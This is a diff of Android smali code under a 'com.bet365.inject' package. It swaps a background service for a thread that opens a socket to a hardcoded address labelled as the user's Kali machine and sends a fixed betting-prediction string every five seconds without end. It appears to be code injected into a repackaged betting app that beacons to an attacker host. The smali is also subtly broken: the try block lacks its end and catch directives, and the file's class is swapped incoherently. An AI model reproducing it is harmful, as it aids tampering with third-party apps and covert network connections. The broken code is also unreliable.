@@ -1,27 +1,42 @@
-.class public Lcom/bet365/inject/MonitorService;
-.super Landroid/app/Service;
+.class public Lcom/bet365/inject/MonitorThread;
+.super Ljava/lang/Thread;
 
-.method public constructor <init>()V
+.field private service:Lcom/bet365/inject/MonitorService;
+
+.method public constructor <init>(Lcom/bet365/inject/MonitorService;)V
     .locals 0
-    invoke-direct {p0}, Landroid/app/Service;-><init>()V
+    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V
+    iput-object p1, p0, Lcom/bet365/inject/MonitorThread;->service:Lcom/bet365/inject/MonitorService;
     return-void
 .end method
 
-.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
-    .locals 1
-    const/4 v0, 0x0
-    return-object v0
-.end method
+.method public run()V
+    .locals 5
+    :try_start_0
+    # CONEXÃO COM O KALI
+    new-instance v0, Ljava/net/Socket;
+    const-string v1, "192.168.1.100"  # <--- TROQUE PELO SEU IP DO KALI
+    const/16 v2, 0x3039              # Porta 12345
+    invoke-direct {v0, v1, v2}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V
 
-.method public onStartCommand(Landroid/content/Intent;II)I
-    .locals 3
-    # Inicia a Thread de Monitoramento
-    new-instance v0, Lcom/bet365/inject/MonitorThread;
-    invoke-direct {v0, p0}, Lcom/bet365/inject/MonitorThread;-><init>(Lcom/bet365/inject/MonitorService;)V
-    invoke-virtual {v0}, Ljava/lang/Thread;->start()V
+    invoke-virtual {v0}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;
+    move-result-object v1
+    new-instance v2, Ljava/io/PrintWriter;
+    invoke-direct {v2, v1}, Ljava/io/PrintWriter;-><init>(Ljava/io/OutputStream;)V
+
+    # LOOP DE ENVIO DE DADOS
+    :loop
+    # Dados simulados (placar, previsão, recomendação)
+    const-string v3, "placar=0-0&previsao=Empate&recomendacao=Aguarde&odds=1.85"
     
-    # Retorna START_STICKY para reiniciar se morrer
-    const/4 v1, 0x2
-    return v1
-.end method
+    invoke-virtual {v2, v3}, Ljava/io/PrintWriter;->println(Ljava/lang/String;)V
+    invoke-virtual {v2}, Ljava/io/PrintWriter;->flush()V
 
+    # Espera 5 segundos
+    const-wide/16 v3, 0x1388
+    invoke-static {v3, v4}, Ljava/lang/Thread;->sleep(J)V
+    goto :loop
+    
+    :catch_0
+    return-void
+.end method
